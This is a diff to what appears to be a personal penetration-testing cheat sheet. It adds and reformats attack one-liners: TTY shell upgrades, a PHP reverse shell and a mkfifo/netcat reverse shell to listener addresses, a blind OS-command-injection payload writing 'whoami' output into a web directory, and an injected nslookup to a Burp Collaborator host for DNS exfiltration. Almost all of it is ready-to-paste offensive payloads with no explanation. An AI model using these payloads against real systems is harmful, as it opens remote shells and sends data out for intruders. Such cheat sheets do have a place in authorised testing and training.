@@ -12,15 +12,23 @@ find / -type f -newermt 2016-09-11 ! -newermt 2016-09-13 2>/dev/null
 python -c 'import pty;pty.spawn('/bin/bash')'
 SHELL=/bin/bash script -q /dev/null
 ```
+
 # Reverse Shell
-- php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
-- m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.2.97 9001 >/tmp/f
+
+```sh
+php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.2.97 9001 >/tmp/f
+```
 
 # Blind OS injection
 
 ```sh
 
 ||whoami>/var/www/images/output.txt||
+
+# using DNS exfiltration Technique
+
+email=x||nslookup+x.burpcollaborator.net||
 
 ```
 
